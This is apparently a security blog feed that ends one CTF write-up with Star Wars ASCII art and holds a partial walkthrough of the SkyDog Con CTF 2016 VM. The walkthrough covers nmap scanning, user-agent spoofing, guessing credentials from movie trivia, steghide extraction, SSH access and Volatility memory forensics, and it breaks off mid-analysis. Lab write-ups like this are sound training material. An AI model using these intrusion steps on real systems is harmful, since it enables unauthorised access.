        \  /\  /  __/ | | | |__| | (_) | | | |  __/   
     __  \/ _\/ \___|_|_|_|_____/ \___/|_|_|_|\___| _ 
     \ \   / /          |  __ \(_)   | | |_   _| | | |
      \ \_/ /__  _   _  | |  | |_  __| |   | | | |_| |
       \   / _ \| | | | | |  | | |/ _` |   | | | __| |
        | | (_) | |_| | | |__| | | (_| |  _| |_| |_|_|
        |_|\___/ \__,_| |_____/|_|\__,_| |_____|\__(_)
</code></pre>

<hr />

<p>%=x%= | |V| |<em>)|</em> |<em>) | |</em>| |   |<em>) |</em>| (<em>  |</em>  |<em>) |  |</em>| |\| (<em>  %=x%=x%=x
~~~~~ | | | |  |</em> | \ | | | |<em>  |</em>) | | <strong>) |<em>  |   |</em> | | | | </strong>) ~~~~~~~~~
LS</p>

<pre><code>             .-. .-.
           .=========.         E x t e r i o r ,   A e r i a l   V i e w
           ||.-.7.-.||         -----------------------------------------
           ||`-' `-'||
           `========='
            `-'| |`-'8               1 .............. Sensor Suite Tower
      ______   |9|   ______          2 ... Heavy Twin Turbolaser Turrets
     /     /\__| |__/\     \         3 ............. Heavy Laser Turrets
    /  \_ / /  |_|  \ \ _/  \        4 ....... TIE Fighter Launch Chutes
   /___(\\\/         \///)___\       5 ............... Heavy Blast Doors
   \____\\`==========='//____/       6 .................... Guard towers
   /     '/ .-------. \\     \       7 ........ Shuttle Landing Platform
__/     //. \`+---+'/ .\\     \__    8 ........... AT-AT Docking Station
</code></pre>

<p>   /\ \    ///x<code>.\|___|/.'x\\\    / /\   9 ................. Connecting Ramp
  /  \ \  //</code>&ndash;.<em>//|   |\</em>.2'\  / /  \
 /  <em>.&ndash;===&lsquo;</em><strong><strong>//.&ndash;=&ndash;.\</strong></strong><em><code>===-._  \
 \  </code>&ndash;===.-.  \ `&ndash;=1&rsquo; /  .&ndash;/.===&ndash;&lsquo; 3 / The pre-fabricated,  multi-function
  \  / /  \\ \  .===./  /4///  \ \  /  Imperial garrison base is the back-
   \/</em>/    \\ | /.&mdash;&ndash;.\ | ///    _\/   bone of the  Empire&rsquo;s  occupational</p>

<pre><code>  \     \\\|/ |_m_| \|///     /      forces. These heavily-armoured for-
   \_____\=============/_____/       tresses have  walls up to 10 meters
   /____///    ___    \\\____\       thick  to  guard   against   ground
   \   (_//\__|||||__/\\_)   /       assaults,  and  powerful  deflector
    \  /  \|,,|||||,,|/  \  /        shields  protect  them  for  air or
     \_____|  | 5 | 6|_____/         space attacks.
           `--'   `--'
</code></pre>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                       U           E x t e r i o r ,   S i d e   V i e w
                      /_\          -------------------------------------
                   1 [___]
                     :`:':           1 .............. Sensor Suite Tower
                     `:::'           2 ... Heavy Twin Turbolaser Turrets
              _       :_:       _    3 ............. Heavy Laser Turrets
            =[ ]2     [%]      [ ]=  4 ....... Tie Fighter Launch Chutes
             :=:      :=:      :=:   5 ............... Heavy Blast Doors
            _|_|_   __| |__   _|_|_  6 .................... Guard Towers
           / /XX|\ /__|_|__\ /|XX\ \
     3    /4/XXX| | _/___\_ | |XXX\ \             7 ....... AT-AT Walker
--===____/--===X|_|/_______\|_|X===--\____===--   8 ........ AT-ST Scout
 /__| |     /l_\\             //_|\     |_|__\
/~~.' |    /:'  \\   _____   //  `:\    | `.  \
</code></pre>

<p>   /   | .&lsquo;   / |    \==|||||==//    | \   <code>. |   \   7    8
  /   .' |   / .'     |  ||5|| 6|    </code>. \   | `.   \  xx=   _
 /<em><em><strong>|</strong>|<strong>/</strong>|</em></em><em><em><strong>l</strong>|||||<strong>l</strong></em></em><strong>|</strong>_<em>|<strong>|</strong></em>_\ ll   &lt;~</p>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                                             O u t e r   D e f e n s e s
        |                      |             ---------------------------
     ^_[]_^                 ^_[]_^
     |----|               5 |----|        1 ... High Voltage Death Fence
</code></pre>

<p> <strong><strong><strong>__<code>-..-'________4________</code>&ndash;..&ndash;&lsquo;</strong></strong></strong>  2 &hellip;&hellip;. Perimeter Gate House
 ===========================================  3 &hellip;&hellip;.. Powered Force Field</p>

<pre><code>      `||'                   `||'         4 .......... Fortified Catwalk
       ||     ^==^   ^==^     ||          5 ......... Observattion tower
</code></pre>

<p> <em><strong>.</strong>__.</em>ll<em>.</em>1<em>|&mdash;|   |&mdash;|</em><strong>.<em>ll</em>.</strong><strong>.</strong>__
 XXX|XXXX|XIIX|XXX|&mdash;| 3 |&mdash;|XXX|XIIX|XXXX|XXXX
 XXX|XXXX|XIIX|XXX| 2|   |  |XXX|XIIX|XXXX|XXXX</p>

<p> The outer perimeter is  marked  by a  high-voltage  &ldquo;death fence.&rdquo;  Powered
 Force fields  placed at regular intervals along the fence may be turned off
 to permit entry and exit.  Observation towers,  connected by fortified cat-
 walks,  are set back from the fence and constantly manned by stormtroopers.
 Other outer  defenses  include energy mine fields,  modified patrol Droids,
 and AT-ST Scout Walkers.</p>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>         _
        /|                               L a n d i n g   P l a t f o r m
      -==+                               -------------------------------
        :
     [__________]               Up to two Lambda-class shuttles and four
     `' ||  ||`-'               AT-AT  Walkers can dock at the platform.
       ========  =xx            A loading  ramp  leads directly from the
        ||  ||    ll            platform into the garrison complex.
 ~~~~~~~~~~~~~~~~~~~~~~
</code></pre>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                                 I n t e r i o r ,   L e v e l s   1 - 5
                                 ---------------------------------------

      ______         ______      The first 5 levels of the garrison com-
     / ____ \_______/ ____ \     plex are of identical layout, construc-
    / /    \_________/    \ \    ted  around  a  level-spanning  surface
   / /      |   3   |  5   \ \   vehicle bay.  Refer to the key below to
   \ \       \_____/_______/ /   determine what each level contains.
   / /    o   |o o|   o    \ \
__/ /  2    .' o4o `.    6  \ \__    1 ... Storage Gallery (levels 1-2),
</code></pre>

<p>   / <strong>/      .&lsquo; .<em>o_o</em>. <code>.      \__ \         Armory (levels 3-4), Training
  / / </code>&ndash;.  .&rsquo; .&lsquo;  10   <code>.</code>.  .&ndash;&rsquo;  \ \        Facilities   and   Recreation
 / /      ~&lsquo; .&rsquo;<code>-._____.-'</code>. `~      \ \       Rooms (level 5)
 \ \     o  &lt;  C  | | |  D  >  o  7  / / 2 &hellip; Stormtrooper Barracks (levels
  \ __      \    &lsquo; &rsquo; &lsquo;    /      </strong>/ /        1-3),    Security    Barracks
   _<em> \  1  |&mdash;&mdash;  9  &mdash;&mdash;|~&ndash;.</em> / __/         (levels 4-5)</p>

<pre><code>  \ \    |====    B====|    Y /      3 ...... Base Security (levels 1-5)
   \ \   |----     ----|   / /       4 ......... Turbolifts (levels 1-6)
   / /   |__A_     _ __| 8 \ \       5 .... Detention Block (levels 1-5)
   \ \      | |   | |      / /       6 ... Technical and Service Person-
    \ \_____| |   | |_____/ /              nel Barracks (levels 1-5)
     \_____ `o|   |o' _____/         7 ... Technical Shops (levels 1-2),
           `--'   `--'                     Medical   Bay    (level   3),
                                           Science Labs (levels 4-5)
            8 ... Storage Gallery (levels 1-2), Droid Shops (levels 3-5)
            9 ...................... Surface Vehicle  Bay  (levels 1-5):
            A .................................. AT-ST Scout Walker Bays
            B ........................................ AT-AT Walker Bays
            C ...................... Vehicle Maintenance and Repair Deck
            D ........................................ Speeder Bike Deck
            10 ........................... Miscellaneous Vehicle Parking
</code></pre>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                                       I n t e r i o r ,   L e v e l   6
                                       ---------------------------------
     ____           ____
    / __ \_________/ __ \        Base command personnel,  control rooms,
   / /  \___________/  \ \       rooms,  trade  mission,  and diplomatic
   \ \ o     oo      o / /       offices are located on this level.
   / /       oo----.   \ \
  / /   8  __oo     `.1 \ \      1 ....... Sensor Monitors, Tractor Beam
</code></pre>

<p>   <strong>/ /\    .~  ||   2   \  \ __                       and Shield Controls
  / </strong>/  \ .&lsquo; 9.&ndash;&rsquo;<code>-.      | /\__ \  2 ....................... Computer Room
 / /   o  \|__:   o  :_____|/ o  \ \ 3 ....................... Meeting Rooms
 \ \__  7 .---: 10   :------.3 __/ / 4 ...... Officers' and Pilots' Quarters
  \__ \  /    </code>&ndash;..&ndash;&lsquo;        \/ __/  5 &hellip; Trade Mission, Diplomatic Offices</p>

<pre><code> \ \/\   5   ||          / /     6 ........... Base Commander's Quarters
  \ \ `.     ||    4    / /                                  and offices
   \ \ o~`---||      o / /       7 ............ Officer Recreation Rooms
   / /6  ____||_____   \ \       8 ............................. Offices
   \ \__/ _________ \__/ /       9 ................... Base Control Room
    \____/         \____/        10 ..................... Reception Area
</code></pre>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                                       I n t e r i o r ,   L e v e l   7
                                       ---------------------------------
    __             __
   /_]\           /[_\        The TIE Fighter  Hanger  Deck  houses  the
   \ \,===========./ /        garrison's TIE fighters in standard-design
   //:o-----------o:\\        ceiling racks.  Bases are usually equipped
  /// X  X X X X  X \\\       with  30 TIE fighters and five TIE bombers
 /// X X  X_X_X  X X \\\      (a single  bomber  takes  up the same rack
</code></pre>

<p>  <strong>/// X X   [</strong><em>]   X X \_</em>   space as two fighters).  Five  to 15 ships
 /_/o X X  1 &amp;/3&amp;    X X o_/\  are on constant  patrol,  depending on the
 ]<em>\ X X   &lt;\</em>//>       //_[/  base&rsquo;s readiness level.</p>

<pre><code>\\\ X X   \&gt;&amp;&lt;/2  X []///
 \\\ X X   []    X []///      1 .............. TIE Fighter Ceiling Racks
  \\\ X   [] []     ///                           (holds up to 40 craft)
   \\:o-----------o://        2 ............. Lift Platforms, to Level 8
   /_/`==========='\_\        3 .................. Flight Control Center
   \_]/           \[_/        X ............................ TIE Fighter
                              [] ............................ TIE Bomber
</code></pre>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                                       I n t e r i o r ,   L e v e l   8
                                       ---------------------------------
                                                  (not shown)
</code></pre>

<p>  The Flight Deck contains the  tractor beam  generators which catapult out-
  going craft into the open sky and reel in landing ships. Pilots relinquish
  control of  their ships during take off and landing because of the limited
  maneuvering area within the chutes.</p>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                           S u b - L e v e l   I n s t a l l a t i o n s
                           ---------------------------------------------
                                            (not shown)
</code></pre>

<p>  A large underground section of the base  houses the main power and back-up
  generators, the tractor beam and deflector shield generators, the environ-
  ment  control  station,  and  the  waste  disposal and refuse units.  Some
  storage facilities are also located here.</p>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Version 1.9 (released 941211).
 Pictures by Lennert Stock  (LS),  Rowan Crawford (-Row),  Ray Brunner,  Bob
 VanderClay and Joe Rumsey.  The pictures work best when shown on a white on
 black screen  (except for some faces)  with a not too fancy font. Contribu-
 tions welcome, email to the adress below. Sources LS: The Star Wars Source-
 book,  Star Wars Imperial Sourcebook,  The Star Wars Rebel Alliance Source-
 book, Star Wars: The Roleplaying Game (2nd Ed) all by West End Games, Inc.</p>

<hr />

<hr />

<p> |<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||______|</p>

<hr />

<p> | \ | | / <strong> \ \        / / \ \   / // </strong> \ | |  | |( )|  <strong> \ |  </strong><strong>|
 |  \| || |  | |\ \  /\  / /   \ _/ /| |  | || |  | ||/ | |</strong>) || |<strong>  <br/>
 | . ` || |  | | \ \/  \/ /     \   / | |  | || |  | |   |  _  / |  </strong>| <br/>
 | |\  || |<strong>| |  \  /\  /       | |  | |</strong>| || |<strong>| |   | | \ \ | |</strong><strong><br/>
 |<em>| _| _</em></strong>/    \/  \/        |<em>|   _</em><strong>/  _</strong><em>/    |</em>|  _\|______|</p>

<pre><code>                            _  ______  _____  _____  _                
         /\                | ||  ____||  __ \|_   _|| |               
        /  \               | || |__   | |  | | | |  | |               
       / /\ \          _   | ||  __|  | |  | | | |  | |               
      / ____ \        | |__| || |____ | |__| |_| |_ |_|               
     /_/    \_\        \____/ |______||_____/|_____|(_)               
</code></pre>

<hr />

<p> |<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||______|</p>

<pre><code>                I hope you enjoyed this challenge
                Please leave comments &amp; feedback
                @ https://www.vulnhub.com/?q=64base
                -----------------------------------
                64Base Challenge by 3mrgnc3
                https://3mrgnc3.ninja/challenges   
                -----------------------------------
</code></pre>

<p>```</p>

<p>```
/ Peace is a lie, there is only passion.  \
| Through passion, I gain strength.       |
| Through strength, I gain power. Through |
| power, I gain victory. Through victory, |
| my chains are broken. The Force shall   |
\ free me.                                /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SkyDog Con CTF 2016 - Catch Me If You Can]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/"/>
    <updated>2018-10-20T18:53:46+03:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can</id>
    <content type="html"><![CDATA[<p>For this box, you have to find 8 flags, each containing an MD5 hash.</p>

<!-- more -->


<p>```
nmap -T4 -sC -sV -p- 192.168.145.136</p>

<p>PORT      STATE  SERVICE  VERSION
22/tcp    closed ssh
80/tcp    open   http     Apache httpd 2.4.18 ((Ubuntu))
|<em>http-server-header: Apache/2.4.18 (Ubuntu)
|</em>http-title: SkyDog Con CTF 2016 &ndash; Catch Me If You Can
443/tcp   open   ssl/http Apache httpd 2.4.18 ((Ubuntu))
|<em>http-server-header: Apache/2.4.18 (Ubuntu)
|</em>http-title: SkyDog Con CTF 2016 &ndash; Catch Me If You Can
| ssl-cert: Subject: commonName=Network Solutions EV Server CA 2/organizationName=Network Solutions L.L.C./stateOrProvinceName=VA/countryName=US
| Not valid before: 2016-09-21T14:51:57
|<em>Not valid after:  2017-09-21T14:51:57
|</em>ssl-date: TLS randomness does not represent time
| tls-alpn:
|   http/1.1
22222/tcp open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:64:7c:d1:55:46:4e:50:e3:ba:cf:4c:1e:81:f9:db (RSA)
|   256 ef:17:df:cc:db:2e:c5:24:e3:9e:25:16:3d:25:68:35 (ECDSA)
|_  256 0e:1b:3f:c3:4a:56:a0:ef:4d:2a:af:a1:7e:94:d2:06 (ED25519)
```</p>

<h2>Flag #1 Don’t go Home Frank! There’s a Hex on Your House.</h2>

<p>Starting with the web server, the web page is the homepage of the SkyDog con. Poking through the source, I found a suspicious comment:</p>

<p>```</p>

<!--[If IE4]><script src="http://chousensha.github.io/oldIE/html5.js"></script><![Make sure to remove this before going to PROD]-->


<p>
```</p>

<p>Going to the above mentioned JS file, on the first line we find a hex string:</p>

<p><code>
/* 666c61677b37633031333230373061306566373164353432363633653964633166356465657d */
</code></p>

<p>Decoded, it gives the first flag: <code>flag{7c0132070a0ef71d542663e9dc1f5dee}</code>. And decoding the MD5 hash gives a hint: <code>nmap</code></p>

<h2>Flag #2 Obscurity or Security?</h2>

<p>I already ran Nmap and saw that SSH is listening on port 22222. Trying to SSH as frank gives the next flag:</p>

<p>```
ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#102;&#x72;&#97;&#x6e;&#x6b;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x31;&#52;&#x35;&#x2e;&#49;&#x33;&#54;">&#102;&#x72;&#x61;&#x6e;&#107;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x34;&#53;&#46;&#x31;&#x33;&#x36;</a> -p 22222
The authenticity of host &lsquo;[192.168.145.136]:22222 ([192.168.145.136]:22222)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is SHA256:DeCMZ74o5wesBHFLyaVY7UTCA7mW+bx6WroHm6AgMqU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;[192.168.145.136]:22222&rsquo; (ECDSA) to the list of known hosts.</p>

<h6>#</h6>

<h1>WARNING</h1>

<h1>FBI &ndash; Authorized access only!                 #</h1>

<h1>Disconnect IMMEDIATELY if you are not an authorized user!!!</h1>

<h1>All actions Will be monitored and recorded</h1>

<h1>Flag{53c82eba31f6d416f331de9162ebe997}</h1>

<h6>#</h6>

<p><a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#x66;&#x72;&#x61;&#x6e;&#107;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x31;&#52;&#x35;&#x2e;&#x31;&#x33;&#54;">&#x66;&#114;&#x61;&#110;&#x6b;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#x34;&#53;&#x2e;&#49;&#51;&#x36;</a>&rsquo;s password:
```</p>

<p>The decoded hint is <code>encrypt</code></p>

<h2>Flag #3 Be Careful Agent, Frank Has Been Known to Intercept Traffic Our Traffic.</h2>

<p>Remember that Nmap found also port 443 open, so I switched to https to check it out and was greeted by a self-signed certificate. Viewing the certificate gives the third flag: <code>flag3{f82366a9ddc064585d54e3f78bde3221}</code></p>

<p><img class="center" src="/images/pentest/skydogctf/flag3.jpg" title="&lsquo;flag3&rsquo; &lsquo;flag3&rsquo;" ></p>

<p>And the next hint is <code>personnel</code></p>

<h2>Flag #4 A Good Agent is Hard to Find.</h2>

<p>I tried navigating to /personnel on the web server and it gave me the following message:</p>

<p><code>
ACCESS DENIED!!! You Do Not Appear To Be Coming From An FBI Workstation. Preparing Interrogation Room 1. Car Batteries Charging....
</code></p>

<p>So we need a specific user agent. Remembering the included JS file of the first flag, that hinted towards an old Internet Explorer version, I revisited it and searched for the string <em>fbi</em> inside it and found the lines:</p>

<p><code>
/* maindev -  6/7/02 Adding temporary support for IE4 FBI Workstations */
/* newmaindev -  5/22/16 Last maindev was and idoit and IE4 is still Gold image -@Support doug.perterson@fbi.gov */
</code></p>

<p>So FBI agents use IE4 on their workstations. Cool, nothing catastrophically wrong there. I grabbed an IE4 user agent from <a href="http://www.useragentstring.com/pages/useragentstring.php?name=Internet+Explorer,">http://www.useragentstring.com/pages/useragentstring.php?name=Internet+Explorer,</a> changed my User Agent to <code>User-Agent: Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)</code>, and went straight to the FBI portal!</p>

<p><img class="center" src="/images/pentest/skydogctf/fbiportal.png" title="&lsquo;fbi portal&rsquo; &lsquo;fbi portal&rsquo;" ></p>

<p>The flag is on the page: <code> flag{14e10d570047667f904261e6d08f520f}</code>, and the decoded value is <code>evidence</code></p>

<h2>Flag #5 The Devil is in the Details &ndash; Or is it Dialogue? Either Way, if it’s Simple, Guessable, or Personal it Goes Against Best Practices</h2>

<p>Following up on the clue <em>new+flag</em>, I tried navigating to 192.168.145.136/newevidence and a basic authentication prompt asked me for credentials. On the FBI portal we have the message &ldquo;Welcome Agent Hanratty&rdquo;. A quick Google reveals that this is a reference to agent Carl Hanratty from the movie Catch Me If You Can. I went through the dialogue (hint hint) on the <a href="https://www.imdb.com/title/tt0264464/characters/nm0000158">IMDB page</a> to find out Carl&rsquo;s daughter is called Grace (simple? guessable? personal?). I tried some combinations in the pop up until I found the right one is <em>carl.hanratty/Grace</em> (remember the naming convention of doug.perterson)</p>

<p><img class="center" src="/images/pentest/skydogctf/newevidence.png" title="&lsquo;new evidence&rsquo; &lsquo;new evidence&rsquo;" ></p>

<p>The flag is in the Evidence Summary File: <code>flag{117c240d49f54096413dd64280399ea9}</code>. The hint is <code>panam</code></p>

<h2>Flag #6 Where in the World is Frank?</h2>

<p>For this one you have to work with the other 2 files from the page, the image and the PDF invoice. The invoice mentions an encryption consultation project:</p>

<p><img class="center" src="/images/pentest/skydogctf/invoice.jpg" title="&lsquo;invoice&rsquo; &lsquo;invoice&rsquo;" ></p>

<p>This might suggest the use of steganography in the image, and this is confirmed if you search for Stefan Hetzl, it turns out he&rsquo;s the author of steghide! And we have the previous hint of panam, which is the passphrase in this case:</p>

<p>```
steghide extract -sf image.jpg
Enter passphrase:
wrote extracted data to &ldquo;flag.txt&rdquo;.
root@kali:~/Downloads# cat flag.txt
flag{d1e5146b171928731385eb7ea38c37b8}
=ILoveFrance</p>

<p>clue=iheartbrenda
```</p>

<h2>Flag #7 Frank Was Caught on Camera Cashing Checks and Yelling &ndash; I’m The Fastest Man Alive!</h2>

<p>This was a movie reference and I had to look it up in other solutions&hellip;&ldquo;I’m The Fastest Man Alive!&rdquo; is a reference to The Flash, whose real name is Barry Allen. For the next part, log in to SSH with the the username <em>barryallen</em> and the password <em>iheartbrenda</em>.</p>

<p><code>
ssh barryallen@192.168.145.136 -p 22222
[...]
barryallen@skydogconctf2016:~$ cat flag.txt
flag{bd2f6a1d5242c962a05619c56fa47ba6}
</code></p>

<p>And the hint for the last flag is <code>theflash</code>.</p>

<h2>Flag #8 Franks Lost His Mind or Maybe it’s His Memory. He’s Locked Himself Inside the Building. Find the Code to Unlock the Door Before He Gets Himself Killed!</h2>

<p>Inside barryallen&rsquo;s home there&rsquo;s a 72M ZIP file called security-system.data:</p>

<p><code>
barryallen@skydogconctf2016:~$ file security-system.data
security-system.data: Zip archive data, at least v2.0 to extract
</code></p>

<p>I transferred it to my machine with scp:</p>

<p>```
scp -P 22222 barryallen@192.168.145.136:security-system.data .</p>

<h6>#</h6>

<h1>WARNING</h1>

<h1>FBI &ndash; Authorized access only!                 #</h1>

<h1>Disconnect IMMEDIATELY if you are not an authorized user!!!</h1>

<h1>All actions Will be monitored and recorded</h1>

<h1>Flag{53c82eba31f6d416f331de9162ebe997}</h1>

<h6>#</h6>

<p><a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#x62;&#97;&#x72;&#114;&#121;&#x61;&#108;&#x6c;&#x65;&#110;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#46;&#49;&#52;&#53;&#46;&#x31;&#x33;&#54;">&#98;&#x61;&#x72;&#x72;&#121;&#97;&#108;&#108;&#101;&#110;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#49;&#x34;&#x35;&#x2e;&#x31;&#x33;&#x36;</a>&rsquo;s password:
security-system.data                          100%   71MB   6.6MB/s   00:10  <br/>
```</p>

<p>I unzipped the archive, but the file command didn&rsquo;t identify it as something specific, it just said it&rsquo;s data. I ran strings on it and saw various references to memory that seem to be linked to a Windows system. Time for some memory forensics with Volatility!</p>

<p>First, we need to identify what type of image we&rsquo;re working with:</p>

<h2>``` </h2>

<h2>Module ImageInfo</h2>

<p>Identify information for the image</p>

<p>volatility imageinfo -f data
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search&hellip;</p>

<pre><code>      Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)
                 AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                 AS Layer2 : FileAddressSpace (/root/Downloads/data)
                  PAE type : PAE
                       DTB : 0x33e000L
                      KDBG : 0x80545b60L
      Number of Processors : 1
 Image Type (Service Pack) : 3
            KPCR for CPU 0 : 0xffdff000L
         KUSER_SHARED_DATA : 0xffdf0000L
       Image date and time : 2016-10-10 22:00:50 UTC+0000
 Image local date and time : 2016-10-10 18:00:50 -0400
</code></pre>

<p>```</p>

<p>It&rsquo;s an image of a Windows XP machine! Next, let&rsquo;s look at the processes:</p>

<h2>``` </h2>

<h2>Module PSList</h2>

<p>Print all running processes by following the EPROCESS lists</p>

<p>volatility pslist -f data
Volatility Foundation Volatility Framework 2.6
Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit</p>

<hr />

<p>0x867c6830 System                    4      0     57      171 &mdash;&mdash;&mdash;      0                                                            <br/>
0x86262900 smss.exe                332      4      3       19 &mdash;&mdash;&mdash;      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x8623b978 csrss.exe               560    332     10      423      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x865ed020 winlogon.exe            588    332     24      512      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x8662d808 services.exe            664    588     15      263      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x866a5670 lsass.exe               676    588     25      356      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x86358a70 vmacthlp.exe            848    664      1       25      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x86651da0 svchost.exe             860    664     21      202      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x865c2790 svchost.exe             944    664     11      258      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x86554020 svchost.exe            1040    664     82     1287      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x866196b8 svchost.exe            1092    664      5       59      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x8643ca18 svchost.exe            1144    664     17      213      0      0 2016-10-10 21:59:15 UTC+0000                               <br/>
0x866fca88 explorer.exe           1540   1520     14      417      0      0 2016-10-10 21:59:16 UTC+0000                               <br/>
0x8656b4d0 spoolsv.exe            1636    664     15      125      0      0 2016-10-10 21:59:16 UTC+0000                               <br/>
0x86338640 VGAuthService.e        1900    664      2       60      0      0 2016-10-10 21:59:25 UTC+0000                               <br/>
0x8667bda0 vmtoolsd.exe           2012    664      9      271      0      0 2016-10-10 21:59:28 UTC+0000                               <br/>
0x864f6440 wmiprvse.exe            488    860     14      251      0      0 2016-10-10 21:59:28 UTC+0000                               <br/>
0x864fbad0 wscntfy.exe             536   1040      1       31      0      0 2016-10-10 21:59:28 UTC+0000                               <br/>
0x85e5dd48 alg.exe                 624    664      8      110      0      0 2016-10-10 21:59:28 UTC+0000                               <br/>
0x866f98b0 vmtoolsd.exe           1352   1540      7      242      0      0 2016-10-10 21:59:29 UTC+0000                               <br/>
0x86674410 ctfmon.exe             1356   1540      1       79      0      0 2016-10-10 21:59:29 UTC+0000                               <br/>
0x865bea48 CCleaner.exe           1388   1540      5      108      0      0 2016-10-10 21:59:29 UTC+0000                               <br/>
0x865c3d78 cmd.exe                1336   1540      1       30      0      0 2016-10-10 22:00:05 UTC+0000                               <br/>
0x8634fbb8 wuauclt.exe            1884   1040      9      198      0      0 2016-10-10 22:00:13 UTC+0000                               <br/>
0x86260a78 wuauclt.exe            1024   1040      6      172      0      0 2016-10-10 22:00:29 UTC+0000                               <br/>
0x8667b488 notepad.exe             268   1540      1       55      0      0 2016-10-10 22:00:41 UTC+0000                               <br/>
0x8640cc10 cmd.exe                1276   2012      0 &mdash;&mdash;&mdash;&mdash;      0      0 2016-10-10 22:00:49 UTC+0000   2016-10-10 22:00:50 UTC+0000
```</p>

<p>I took note of that Notepad process and several cmd.exes and then dumped the files:</p>

<h2>``` </h2>

<h2>Module FileScan</h2>

<p>Pool scanner for file objects</p>

<p>volatility filescan -f data > filelist.txt
Volatility Foundation Volatility Framework 2.6
```</p>

